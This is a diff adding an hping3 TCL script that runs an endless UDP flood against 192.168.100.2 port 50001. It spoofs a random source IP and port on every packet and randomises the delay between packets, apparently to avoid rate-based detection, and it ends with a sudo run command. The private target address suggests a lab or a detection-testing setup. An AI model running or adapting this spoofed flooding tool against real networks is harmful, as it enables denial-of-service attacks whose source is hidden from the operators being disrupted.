@@ -1,0 +1,45 @@
+# random_interval.htcl
+# UDP Flood with random send intervals (randomized inter-packet delay) using hping3 TCL scripting
+
+set dst_ip "192.168.100.2"
+set dst_port 50001
+set count 0
+
+# Minimum and maximum delay (in milliseconds)
+set min_delay_ms 1       ;# minimum interval: 1ms
+set max_delay_ms 100     ;# maximum interval: 100ms
+
+# Function to generate random IP address
+proc random_ip {} {
+    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
+}
+
+# Function to generate random source port (1024–65535)
+proc random_port {} {
+    return [expr {int(rand()*64512) + 1024}]
+}
+
+# Function to generate a random interval between min and max (in ms)
+proc random_interval_ms {min max} {
+    return [expr {$min + int(rand()*($max - $min + 1))}]
+}
+
+while {1} {
+    set saddr [random_ip]
+    set sport [random_port]
+    # UDP packet: random source IP, random source port, dest port 50001, TTL=64, empty payload
+    set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+udp(sport=$sport,dport=$dst_port)"
+    hping send $pkt
+    incr count
+
+    # Print every 1000 packets sent
+    if {[expr {$count % 1000}] == 0} {
+        puts "$count UDP packets sent so far..."
+    }
+
+    # Wait a random interval before sending next packet
+    set delay_ms [random_interval_ms $min_delay_ms $max_delay_ms]
+    after $delay_ms
+}
+
+# To run: sudo hping3 exec random_interval.htcl
